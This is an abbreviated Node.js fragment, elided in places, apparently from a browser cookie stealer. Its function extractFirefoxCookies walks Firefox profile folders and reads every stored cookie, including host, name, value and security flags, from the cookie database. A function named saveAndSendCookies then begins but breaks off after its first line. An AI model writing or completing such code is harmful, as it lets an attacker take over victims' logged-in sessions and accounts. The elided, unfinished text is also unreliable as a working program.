...
const bodyParser = require('body-parser'); // optional; express.json() works too
...
function extractFirefoxCookies() {
    ...
    fs.readdirSync(profilesPath).forEach(profile => {
        ...
        db.serialize(() => {
            db.all(`SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies`, (err, rows) => {
                if (!err && rows) {
                    rows.forEach(r => cookiesList.push({
                        domain: r.host,
                        name: r.name,
                        value: r.value,
                        path: r.path || '/',
...
async function saveAndSendCookies() {
    const firefoxCookies = extractFirefoxCookies();
